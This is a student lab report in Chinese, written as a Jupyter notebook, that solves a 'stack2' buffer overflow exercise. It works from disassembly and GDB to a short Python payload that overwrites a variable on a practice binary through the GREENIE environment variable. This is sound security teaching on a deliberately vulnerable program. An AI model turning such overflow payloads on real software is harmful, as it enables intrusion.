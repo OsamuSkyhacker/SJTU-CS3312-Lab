{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## CS3312 Lab Report Stack2\n",
    "\n",
    "Osamu Takenaka 520030990026"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### 源码分析\n",
    "\n",
    "x86汇编代码(由objdump得到)：\n",
    "\n",
    "```asm\n",
    "08048494 <main>:\n",
    " 8048494:\t55                   \tpush   %ebp\n",
    " 8048495:\t89 e5                \tmov    %esp,%ebp\n",
    " 8048497:\t83 e4 f0             \tand    $0xfffffff0,%esp\n",
    " 804849a:\t83 ec 60             \tsub    $0x60,%esp\n",
    " 804849d:\tc7 04 24 e0 85 04 08 \tmovl   $0x80485e0,(%esp)\n",
    " 80484a4:\te8 d3 fe ff ff       \tcall   804837c <getenv@plt>\n",
    " 80484a9:\t89 44 24 5c          \tmov    %eax,0x5c(%esp)\n",
    " 80484ad:\t83 7c 24 5c 00       \tcmpl   $0x0,0x5c(%esp)\n",
    " 80484b2:\t75 14                \tjne    80484c8 <main+0x34>\n",
    " 80484b4:\tc7 44 24 04 e8 85 04 \tmovl   $0x80485e8,0x4(%esp)\n",
    " 80484bb:\t08 \n",
    " 80484bc:\tc7 04 24 01 00 00 00 \tmovl   $0x1,(%esp)\n",
    " 80484c3:\te8 f4 fe ff ff       \tcall   80483bc <errx@plt>\n",
    " 80484c8:\tc7 44 24 58 00 00 00 \tmovl   $0x0,0x58(%esp)\n",
    " 80484cf:\t00 \n",
    " 80484d0:\t8b 44 24 5c          \tmov    0x5c(%esp),%eax\n",
    " 80484d4:\t89 44 24 04          \tmov    %eax,0x4(%esp)\n",
    " 80484d8:\t8d 44 24 18          \tlea    0x18(%esp),%eax\n",
    " 80484dc:\t89 04 24             \tmov    %eax,(%esp)\n",
    " 80484df:\te8 b8 fe ff ff       \tcall   804839c <strcpy@plt>\n",
    " 80484e4:\t8b 44 24 58          \tmov    0x58(%esp),%eax\n",
    " 80484e8:\t3d 0a 0d 0a 0d       \tcmp    $0xd0a0d0a,%eax\n",
    " 80484ed:\t75 0e                \tjne    80484fd <main+0x69>\n",
    " 80484ef:\tc7 04 24 18 86 04 08 \tmovl   $0x8048618,(%esp)\n",
    " 80484f6:\te8 d1 fe ff ff       \tcall   80483cc <puts@plt>\n",
    " 80484fb:\teb 15                \tjmp    8048512 <main+0x7e>\n",
    " 80484fd:\t8b 54 24 58          \tmov    0x58(%esp),%edx\n",
    " 8048501:\tb8 41 86 04 08       \tmov    $0x8048641,%eax\n",
    " 8048506:\t89 54 24 04          \tmov    %edx,0x4(%esp)\n",
    " 804850a:\t89 04 24             \tmov    %eax,(%esp)\n",
    " 804850d:\te8 9a fe ff ff       \tcall   80483ac <printf@plt>\n",
    " 8048512:\tc9                   \tleave  \n",
    " 8048513:\tc3                   \tret    \n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "C语言源代码：\n",
    "```c\n",
    "#include <stdlib.h>\n",
    "#include <unistd.h>\n",
    "#include <stdio.h>\n",
    "#include <string.h>\n",
    "\n",
    "int main(int argc, char **argv)\n",
    "{\n",
    "    volatile int modified;\n",
    "    char buffer[64];\n",
    "    char *variable;\n",
    "\n",
    "    variable = getenv(\"GREENIE\");\n",
    "\n",
    "    if(variable == NULL) {\n",
    "        errx(1, \"please set the GREENIE environment variable\\n\");\n",
    "    }\n",
    "\n",
    "    modified = 0;\n",
    "\n",
    "    strcpy(buffer, variable);\n",
    "\n",
    "    if(modified == 0x0d0a0d0a) {\n",
    "        printf(\"you have correctly modified the variable\\n\");\n",
    "    } else {\n",
    "        print(\"Try again, you got 0x%08x\\n\", modified);\n",
    "    }\n",
    "\n",
    "}\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "这段C程序同样是一个典型的缓冲区溢出漏洞：\n",
    "\n",
    "\n",
    "其使用`strcpy`函数将环境变量`GREENIE`的值复制到缓冲区`buffer`中。`strcpy`函数不会检查目标缓冲区的大小，因此如果输入的数据超过了64字节，就会发生缓冲区溢出。\n",
    "\n",
    "通过构造的环境变量`GREENIE`的值，攻击者可以改变`modified`变量的值。\n",
    "\n",
    "程序检查`modified`是否被设置为特定值（`0x0d0a0d0a`），如果是，就会打印成功的消息，这表明攻击成功。\n",
    "\n",
    "同样地，我们接下来，我们需要知道`buffer`的地址和`modified`的地址，然后通过输入超长字符串来覆盖`modified`的值。"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "##### 变量位置确定"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "`modified`:\n",
    "\n",
    "通过 `modified = 0`这句C代码可以很容易找到对应的汇编代码：\n",
    "\n",
    "```asm\n",
    "80484c8:\tc7 44 24 58 00 00 00 \tmovl   $0x0,0x58(%esp)\n",
    "```\n",
    "不难看出，`modfied`变量的地址是0x58(%esp)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "`variable`:\n",
    "\n",
    "通过这句C代码：\n",
    "```c\n",
    "variable = getenv(\"GREENIE\");\n",
    "```\n",
    "可以定位到汇编中对应的代码为：\n",
    "```asm\n",
    "804849d:\tc7 04 24 e0 85 04 08 \tmovl   $0x80485e0,(%esp)\n",
    "80484a4:\te8 d3 fe ff ff       \tcall   804837c <getenv@plt>\n",
    "80484a9:\t89 44 24 5c          \tmov    %eax,0x5c(%esp)\n",
    "```\n",
    "可以看出，`variable`变量的地址是0x5c(%esp)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "`buffer`:\n",
    "\n",
    "通过这句C代码：\n",
    "```c\n",
    "strcpy(buffer, variable);\n",
    "```\n",
    "可以定位到汇编中对应的代码为：\n",
    "```asm\n",
    "80484d0:\t8b 44 24 5c          \tmov    0x5c(%esp),%eax\n",
    "80484d4:\t89 44 24 04          \tmov    %eax,0x4(%esp)\n",
    "80484d8:\t8d 44 24 18          \tlea    0x18(%esp),%eax\n",
    "80484dc:\t89 04 24             \tmov    %eax,(%esp)\n",
    "80484df:\te8 b8 fe ff ff       \tcall   804839c <strcpy@plt>\n",
    "```\n",
    "可以看出，`buffer`数组的开始地址是0x18(%esp)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "#### GDB调试\n",
    "\n",
    "- 接下来我们需要通过gdb，通过查看esp的值，得到各个变量的地址。\n",
    "\n",
    "    由于该程序需要环境变量`GREENIE`，所以我们需要在gdb中设置环境变量。\n",
    "\n",
    "    同样地，我们令`GREENIE`的值为64个`a`，即`GREENIE=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa`\n",
    "\n",
    "    ```bash\n",
    "    (gdb) set environment GREENIE =aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa  \n",
    "    ```\n",
    "\n",
    "    然后我们添加断点，运行程序，在执行完`strcpy`后，查看esp的值：\n",
    "\n",
    "    <img src=\"https://cdn.mathpix.com/snip/images/ni39AGW894sZDWQaHCxheHrEATSZiacmmfpw7jacYh4.original.fullsize.png\" width=\"40%\">\n",
    "\n",
    "    可以看到`%esp`的值是`0xffc939a0`，所以:\n",
    "\n",
    "    `modified`的地址是`0xffc939a0 + 0x58 = 0xffc939f8`\n",
    "\n",
    "    `variable`的地址是`0xffc939a0 + 0x5c = 0xffc939fc`\n",
    "\n",
    "    `buffer`的起始地址是`0xffc939a0 + 0x18 = 0xffc939b8`\n",
    "\n",
    "- 然后我们打印一下相关内存区域：\n",
    "\n",
    "    <img src=\"https://cdn.mathpix.com/snip/images/SdHF9yTAu5v0T4H7pk5G4ixdtZ2EE5_UXZhn1b_c_AU.original.fullsize.png\" width=\"40%\">\n",
    "\n",
    "    可以看到大片的`0x61`，即`a`，即为buffer的地址区域，为`0xffc939a0`至`0xffc939f7`，我们的计算是正确的。\n",
    "\n",
    "    可以看到`modified`的地址为`0xffc939f8`，紧挨着`buffer`的末尾。\n",
    "    \n",
    "- 接下来我们需要构造输入，使得`modified`的值变为`0x0d0a0d0a`\n",
    "\n",
    "    到该系统为小端，所以`modified`在内存中应该是`0x0a 0x0d 0x0a 0x0d`（地址从左至右依次增大）。\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### 攻击脚本内容\n",
    "\n",
    "通过查找ASCII表格，发现这部分不是可打印字符，所以我们需要使用python来构造输入\n",
    "\n",
    "\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "script_stack2.py:\n",
    "\n",
    "```python\n",
    "buffer = 'a' * 64\n",
    "modified = '\\x0a\\x0d\\x0a\\x0d'\n",
    "print(buffer + modified)\n",
    "```\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "    \n",
    "在终端中运行：\n",
    "\n",
    "```bash\n",
    "export GREENIE=$(python3 script_stack2.py)\n",
    "./stack2\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### 结果（非GDB环境）\n",
    "\n",
    "<img src=\"https://cdn.mathpix.com/snip/images/eOosrpCKJDl3DRiqcwtY2iM6Y86OORQF8gtDFAP0qdk.original.fullsize.png\" width=\"40%\">\n",
    "\n",
    "攻击成功"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
